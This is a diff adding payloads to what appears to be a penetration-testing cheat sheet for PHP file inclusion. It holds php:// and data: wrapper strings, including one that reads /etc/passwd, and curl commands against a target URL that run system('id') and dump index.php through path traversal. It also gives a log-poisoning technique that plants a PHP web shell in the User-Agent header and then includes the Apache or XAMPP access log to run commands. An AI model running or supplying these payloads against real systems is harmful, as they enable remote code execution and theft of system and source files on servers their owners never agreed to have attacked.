@@ -71,3 +71,23 @@ php://fd/3php://fd/3
 php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd
 data:text/plain,<?php phpinfo(); ?>data:text/plain,<?php phpinfo(); ?>
 ```
+
+
+```bash
+#execute id command
+curl -s --path-as-is "$TARGET_URL/index.php?page=data://text/plain,<?php%20echo%20system('id');?>"
+#read the contents of index.php
+curl -s --path-as-is "$TARGET_URL/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../var/www/html/index.php"
+```
+
+Log poisoning:
+```burp-suite
+User-Agent: CHROME <?php echo system($_GET['exec']);?>
+```
+Then execute the poisoned log file by including it:
+```bash
+#linux
+curl -s --path-as-is $TARGET_URL/../../../../../../../../../var/log/apache2/access.log&exec=ls
+#windows using xampp
+curl -s --path-as-is $TARGET_URL/../../../../../../../../../xampp/apache/logs/access.log&exec=dir
+```
